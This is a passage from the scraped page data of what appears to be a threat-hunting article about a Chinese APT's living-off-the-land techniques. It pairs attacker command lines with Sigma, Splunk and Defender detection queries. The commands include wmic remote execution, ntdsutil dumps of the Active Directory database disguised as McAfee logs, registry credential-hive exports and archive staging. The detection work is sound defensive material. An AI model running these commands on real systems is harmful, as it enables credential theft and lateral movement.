CommandLine=”*reg query hklm\\\\software\\\\realvnc\\\\Allusers*” OR CommandLine=”*reg query hklm\\\\software\\\\realvnc\\\\Allusers\\\\vncserver*” OR CommandLine=”*reg query hkcu\\\\software\\*\\\\putty\\\\session*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_242":{"__typename":"Paragraph","id":"dcff7a17d5b3_242","name":"6cc8","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_regedit_export_critical_keys.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":212,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_regedit_export_critical_keys.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":100,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":101,"end":202,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_regedit_export_critical_keys.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*oXKWo7ZynLSVpKIu"}},"Paragraph:dcff7a17d5b3_243":{"__typename":"Paragraph","id":"dcff7a17d5b3_243","name":"97a2","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_244":{"__typename":"Paragraph","id":"dcff7a17d5b3_244","name":"5ba9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (Image=”*\\\\regedit.exe” AND (CommandLine=”* \u002FE *” OR CommandLine=”* -E *”) AND (CommandLine=”*hklm*” OR CommandLine=”*hkey_local_machine*”) AND (CommandLine=”*\\\\system” OR CommandLine=”*\\\\sam” OR CommandLine=”*\\\\security”)) | table ParentImage,CommandLine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_245":{"__typename":"Paragraph","id":"dcff7a17d5b3_245","name":"2d01","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_246":{"__typename":"Paragraph","id":"dcff7a17d5b3_246","name":"b965","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (FolderPath endswith @’\\regedit.exe’ and (ProcessCommandLine contains @’ \u002FE ‘ or ProcessCommandLine contains @’ -E ‘) and (ProcessCommandLine contains @’hklm’ or ProcessCommandLine contains @’hkey_local_machine’) and (ProcessCommandLine endswith @’\\system’ or ProcessCommandLine endswith @’\\sam’ or ProcessCommandLine endswith @’\\security’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_247":{"__typename":"Paragraph","id":"dcff7a17d5b3_247","name":"55fb","type":"H4","href":null,"layout":null,"metadata":null,"text":"Additional Commands","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_248":{"__typename":"Paragraph","id":"dcff7a17d5b3_248","name":"c0fc","type":"PRE","href":null,"layout":null,"metadata":null,"text":"7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_249":{"__typename":"Paragraph","id":"dcff7a17d5b3_249","name":"1d9f","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — LOLBAS Chinese APT Creating a 7z Achrive in temp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_250":{"__typename":"Paragraph","id":"dcff7a17d5b3_250","name":"957f","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT Creating a 7z Archive in temp.yml at main · Schmouni242\u002FSigma-Rules\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":223,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Creating%20a%207z%20Archive%20in%20temp.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":99,"end":213,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Creating%20a%207z%20Archive%20in%20temp.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lRxB4UhI7_XAh01m"}},"Paragraph:dcff7a17d5b3_251":{"__typename":"Paragraph","id":"dcff7a17d5b3_251","name":"488c","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_252":{"__typename":"Paragraph","id":"dcff7a17d5b3_252","name":"af35","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\7z.exe” OR OriginalFileName=”7z.exe”) AND CommandLine=”*a -p*” AND (CommandLine=”*c:\\\\windows\\\\temp\\\\*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"markdown"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_253":{"__typename":"Paragraph","id":"dcff7a17d5b3_253","name":"2e19","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_254":{"__typename":"Paragraph","id":"dcff7a17d5b3_254","name":"f957","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\7z.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’7z.exe’ or ProcessVersionInfoOriginalFileName =~ @’7z.exe’) and ProcessCommandLine contains @’a -p’ and ProcessCommandLine contains @’c:\\windows\\temp\\’)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_255":{"__typename":"Paragraph","id":"dcff7a17d5b3_255","name":"7b90","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Windows\\system32\\pcwrun.exe C:\\Users\\Administrator\\Desktop\\Win.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"makefile"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_256":{"__typename":"Paragraph","id":"dcff7a17d5b3_256","name":"d35c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Windows\\System32\\cmdbak.exe \u002Fc ping -n 1 127.0.0.1 \u003E C:\\Windows\\temp\\putty.log","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_257":{"__typename":"Paragraph","id":"dcff7a17d5b3_257","name":"cb76","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Windows\\Temp\\tmp.log","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"lua"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_258":{"__typename":"Paragraph","id":"dcff7a17d5b3_258","name":"e024","type":"PRE","href":null,"layout":null,"metadata":null,"text":"“cmd.exe” \u002Fc dir \\\\127.0.0.1\\C$ \u002Fod","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_259":{"__typename":"Paragraph","id":"dcff7a17d5b3_259","name":"2f95","type":"PRE","href":null,"layout":null,"metadata":null,"text":"“cmd.exe” \u002Fc ping –a –n 1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_260":{"__typename":"Paragraph","id":"dcff7a17d5b3_260","name":"4243","type":"PRE","href":null,"layout":null,"metadata":null,"text":"“cmd.exe” \u002Fc wmic \u002Fuser: \u002Fpassword: process call create “net stop \\”\\” \u003E C:\\Windows\\Temp\\tmp.log”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_261":{"__typename":"Paragraph","id":"dcff7a17d5b3_261","name":"53bf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FQ \u002Fc cd 1\u003E \\\\127.0.0.1\\ADMIN$\\__ 2\u003E&1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_262":{"__typename":"Paragraph","id":"dcff7a17d5b3_262","name":"98e2","type":"PRE","href":null,"layout":null,"metadata":null,"text":"net use \\\\127.0.0.1\\IPC$ \u002Fy \u002Fd","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_263":{"__typename":"Paragraph","id":"dcff7a17d5b3_263","name":"8f73","type":"PRE","href":null,"layout":null,"metadata":null,"text":"powershell start-process -filepath c:\\windows\\temp\\.bat -windowstyle Hidden rar.exe a –{REDACTED} c:\\Windows\\temp\\{REDACTED}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_264":{"__typename":"Paragraph","id":"dcff7a17d5b3_264","name":"5d06","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — LOLBAS Chinese APT PowerShell Hidden RAR Execution","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_265":{"__typename":"Paragraph","id":"dcff7a17d5b3_265","name":"8217","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT PowerShell Hidden RAR Execution.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":202,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20PowerShell%20Hidden%20RAR%20Execution.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":77,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":78,"end":192,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20PowerShell%20Hidden%20RAR%20Execution.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*ZRBAZLmD9zR34sgx"}},"Paragraph:dcff7a17d5b3_266":{"__typename":"Paragraph","id":"dcff7a17d5b3_266","name":"3635","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_267":{"__typename":"Paragraph","id":"dcff7a17d5b3_267","name":"8ee3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\powershell.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’powershell.exe’ or ProcessVersionInfoOriginalFileName =~ @’powershell.exe’) and ProcessCommandLine contains @’start-process’ and (ProcessCommandLine contains @’filepath c:\\windows\\temp\\’ and ProcessCommandLine contains @’windowstyle Hidden rar.exe’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_268":{"__typename":"Paragraph","id":"dcff7a17d5b3_268","name":"b759","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_269":{"__typename":"Paragraph","id":"dcff7a17d5b3_269","name":"9fa3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\powershell.exe” OR OriginalFileName=”powershell.exe”) AND CommandLine=”*start-process*” AND ((CommandLine=”*filepath c:\\\\windows\\\\temp\\\\*”) AND (CommandLine=”*windowstyle Hidden rar.exe*”)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_270":{"__typename":"Paragraph","id":"dcff7a17d5b3_270","name":"a43b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"D:\\{REDACTED}\\","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_271":{"__typename":"Paragraph","id":"dcff7a17d5b3_271","name":"a544","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic \u002Fnode:{REDACTED} \u002Fuser:{REDACTED} \u002Fpassword:{REDACTED} cmd \u002Fc whoami","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_272":{"__typename":"Paragraph","id":"dcff7a17d5b3_272","name":"477b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"xcopy C:\\windows\\temp\\hp d:\\{REDACTED}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_273":{"__typename":"Paragraph","id":"dcff7a17d5b3_273","name":"7832","type":"H4","href":null,"layout":null,"metadata":null,"text":"Command Execution","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_274":{"__typename":"Paragraph","id":"dcff7a17d5b3_274","name":"615e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"7z.exe a -p {REDACTED} c:\\windows\\temp\\{REDACTED}.7z c:\\windows\\temp\\*","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_275":{"__typename":"Paragraph","id":"dcff7a17d5b3_275","name":"f57f","type":"PRE","href":null,"layout":null,"metadata":null,"text":"“C:\\pstools\\psexec.exe” \\\\{REDACTED} -s cmd \u002Fc “cmd.exe \u002Fc “netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=9999””","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_276":{"__typename":"Paragraph","id":"dcff7a17d5b3_276","name":"d8ac","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Windows\\system32\\pcwrun.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"makefile"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_277":{"__typename":"Paragraph","id":"dcff7a17d5b3_277","name":"d659","type":"PRE","href":null,"layout":null,"metadata":null,"text":"C:\\Users\\Administrator\\Desktop\\Win.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"makefile"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_278":{"__typename":"Paragraph","id":"dcff7a17d5b3_278","name":"3f5d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FC dir \u002FS \\\\{REDACTED}\\c$\\Users\\{REDACTED} \u003E\u003E c:\\windows\\temp\\{REDACTED}.tmp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"r"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_279":{"__typename":"Paragraph","id":"dcff7a17d5b3_279","name":"9439","type":"PRE","href":null,"layout":null,"metadata":null,"text":"“cmd.exe” \u002Fc wmic process call create “cmd.exe \u002Fc mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\McAfee_Logs\\”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_280":{"__typename":"Paragraph","id":"dcff7a17d5b3_280","name":"756d","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — LOLBAS Chinese APT Credential Dumping as McAffee Logs","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_281":{"__typename":"Paragraph","id":"dcff7a17d5b3_281","name":"cd88","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT Credential Dumping as McAffee Logs.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":205,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Dumping%20as%20McAffee%20Logs.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":80,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":81,"end":195,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Dumping%20as%20McAffee%20Logs.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*U11lAN3d4894d1ec"}},"Paragraph:dcff7a17d5b3_282":{"__typename":"Paragraph","id":"dcff7a17d5b3_282","name":"5832","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_283":{"__typename":"Paragraph","id":"dcff7a17d5b3_283","name":"7df3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\cmd.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’cmd.exe’ or ProcessVersionInfoOriginalFileName =~ @’cmd.exe’) and ProcessCommandLine contains @’\u002Fc wmic process call create’ and (ProcessCommandLine contains @’cmd.exe \u002Fc mkdir C:\\windows\\Temp\\McAfee_Logs’ or ProcessCommandLine contains @’& ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\McAfee_Logs\\’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_284":{"__typename":"Paragraph","id":"dcff7a17d5b3_284","name":"32a7","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_285":{"__typename":"Paragraph","id":"dcff7a17d5b3_285","name":"5a74","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\cmd.exe” OR OriginalFileName=”cmd.exe”) AND CommandLine=”*\u002Fc wmic process call create*” AND (CommandLine=”*cmd.exe \u002Fc mkdir C:\\\\windows\\\\Temp\\\\McAfee_Logs*” OR CommandLine=”*& ntdsutil \\\\\\”ac i ntds\\\\\\” ifm \\\\\\”create full C:\\\\Windows\\\\Temp\\\\McAfee_Logs\\\\*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_286":{"__typename":"Paragraph","id":"dcff7a17d5b3_286","name":"f784","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FQ \u002Fc cd 1\u003E \\\\127.0.0.1\\ADMIN$\\__ 2\u003E&1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_287":{"__typename":"Paragraph","id":"dcff7a17d5b3_287","name":"ee2d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FQ \u002Fc net group “domain admins” \u002Fdom 1\u003E\\\\127.0.0.1\\ADMIN$\\__ 2\u003E&1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_288":{"__typename":"Paragraph","id":"dcff7a17d5b3_288","name":"1721","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FQ \u002Fc wmic process call create “cmd.exe \u002Fc mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\tmp\\” 1\u003E \\\\127.0.0.1\\ADMIN$\\ 2\u003E&1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_289":{"__typename":"Paragraph","id":"dcff7a17d5b3_289","name":"8309","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — LOLBAS Chinese APT Credential Dumping to ADMIN localhost","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_290":{"__typename":"Paragraph","id":"dcff7a17d5b3_290","name":"e71f","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT Credential Dumping to ADMIN localhost.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Dumping%20to%20ADMIN%20localhost.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Dumping%20to%20ADMIN%20localhost.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*Si7BqkHyK_SyPduo"}},"Paragraph:dcff7a17d5b3_291":{"__typename":"Paragraph","id":"dcff7a17d5b3_291","name":"ada3","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_292":{"__typename":"Paragraph","id":"dcff7a17d5b3_292","name":"5462","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((FolderPath endswith @’\\cmd.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’cmd.exe’ or ProcessVersionInfoOriginalFileName =~ @’cmd.exe’) and ProcessCommandLine contains @’\u002Fc wmic process call create’ and (ProcessCommandLine contains @’”cmd.exe \u002Fc mkdir C:\\Windows\\Temp\\tmp’ or ProcessCommandLine contains @’& ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\tmp\\” 1\u003E \\\\127.0.0.1\\ADMIN$\\ 2\u003E&1'))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_293":{"__typename":"Paragraph","id":"dcff7a17d5b3_293","name":"dcb2","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_294":{"__typename":"Paragraph","id":"dcff7a17d5b3_294","name":"318a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((Image=”*\\\\cmd.exe” OR OriginalFileName=”cmd.exe”) AND CommandLine=”*\u002Fc wmic process call create*” AND (CommandLine=”*\\”cmd.exe \u002Fc mkdir C:\\\\Windows\\\\Temp\\\\tmp*” OR CommandLine=”*& ntdsutil \\\\\\”ac i ntds\\\\\\” ifm \\\\\\”create full C:\\\\Windows\\\\Temp\\\\tmp\\\\\\” 1\u003E \\\\127.0.0.1\\\\ADMIN$\\\\ 